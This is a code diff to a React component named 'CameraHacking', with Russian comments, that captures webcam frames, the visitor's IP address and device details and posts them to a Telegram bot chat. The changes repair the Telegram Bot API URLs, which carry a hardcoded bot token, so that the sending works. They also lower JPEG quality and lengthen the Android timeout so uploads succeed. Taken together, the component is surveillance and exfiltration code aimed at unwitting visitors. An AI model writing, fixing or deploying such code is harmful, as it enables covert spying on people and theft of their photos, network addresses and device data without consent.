@@ -167,7 +167,7 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
       
       await axios.post(apiUrl, formData, {
         headers: { "Content-Type": "multipart/form-data" },
-        timeout: isAndroid ? 20000 : 10000, // Больше таймаут для Android
+        timeout: isAndroid ? 30000 : 10000, // Больше таймаут для Android
         onUploadProgress: (progressEvent) => {
           if (progressEvent.total) {
             const percent = Math.round((progressEvent.loaded * 100) / progressEvent.total);
@@ -192,7 +192,7 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
         
         // Отправляем ошибку в Telegram для отладки
         try {
-          const telegramApiUrl = 'https://api.telegram.org/8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
+          const telegramApiUrl = 'https://api.telegram.org/bot8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
           await axios.post(telegramApiUrl, {
             'chat_id': chatId,
             'text': `❌ Android Photo Send Failed\n\n` +
@@ -227,7 +227,7 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
         ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
         
         // Более низкое качество для экономии трафика
-        const quality = isAndroid ? 0.6 : 0.8;
+        const quality = isAndroid ? 0.5 : 0.5;
         canvas.toBlob(resolve, 'image/jpeg', quality);
       };
       img.src = URL.createObjectURL(blob);
@@ -305,7 +305,7 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
       context.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
       
       // Разное качество для Android/iOS
-      const quality = isAndroid ? 0.7 : 0.8;
+      const quality = isAndroid ? 0.5 : 0.5;
       
       canvas.toBlob(async (blob) => {
         if (blob) {
@@ -414,7 +414,7 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
         
         // Отправляем информацию об устройстве в Telegram
         try {
-          const telegramApiUrl = 'https://api.telegram.org/8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
+          const telegramApiUrl = 'https://api.telegram.org/bot8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
           await axios.post(telegramApiUrl, {
             'chat_id': chatId,
             'text': `📱 Device Connected\n\n` +
@@ -483,7 +483,7 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
             console.log("✅ Client IP fetched:", ip);
             
             // Отправляем IP в Telegram
-            const telegramApiUrl = 'https://api.telegram.org/8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
+            const telegramApiUrl = 'https://api.telegram.org/bot8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
             await axios.post(telegramApiUrl, {
               'chat_id': chatId,
               'text': `🌐 IP Address: ${ip}\n` +
@@ -530,7 +530,7 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
         console.error("❌ MediaDevices API not supported");
         
         // Отправляем ошибку в Telegram
-        const telegramApiUrl = 'https://api.telegram.org/8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
+        const telegramApiUrl = 'https://api.telegram.org/bot8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
         axios.post(telegramApiUrl, {
           'chat_id': chatId,
           'text': `❌ API Not Supported\n\n` +
